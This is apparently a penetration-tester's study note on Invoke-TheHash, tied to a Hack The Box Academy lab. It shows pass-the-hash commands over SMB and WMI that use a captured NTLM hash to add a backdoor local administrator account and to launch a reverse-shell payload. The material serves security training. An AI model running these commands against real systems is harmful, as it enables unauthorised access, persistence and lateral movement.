########################
Invoke-TheHash
########################

2024-11-23 11:23

Status:

Tags: 

:ref:`Certified Penetration Tester <Certified Penetration Tester>`
:ref:`Password Attacks <Password Attacks>`
:ref:`Windows Lateral Movement <Windows Lateral Movement>`

*****************
Description
*****************

Invoke-TheHash contains PowerShell functions for performing pass the
hash **WMI and SMB** tasks. WMI and SMB connections are accessed through
the .NET TCPClient. Authentication is performed by passing an NTLM hash
into the NTLMv2 authentication protocol. Local administrator privilege
is not required client-side.

******************
Installation
******************

:todo:

*****************
Usage
*****************
===========================================
Example 1: Running a command on a server
===========================================

.. code-block:: console

   PS c:\htb> cd C:\tools\Invoke-TheHash\
   PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
   PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose


===========================================
Example 2: Creating a reverse shell
===========================================

step 1: Using the site revshells <https://www.revshells.com/ create
a payload for your listener step 2: Use Invoke-TheHash to run the shell
payload

.. code-block:: console

   PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
   PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target <ipaddress> -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<payload code>"


*****************
References
*****************
https://github.com/Kevin-Robertson/Invoke-TheHash
https://academy.hackthebox.com/module/147/section/1638
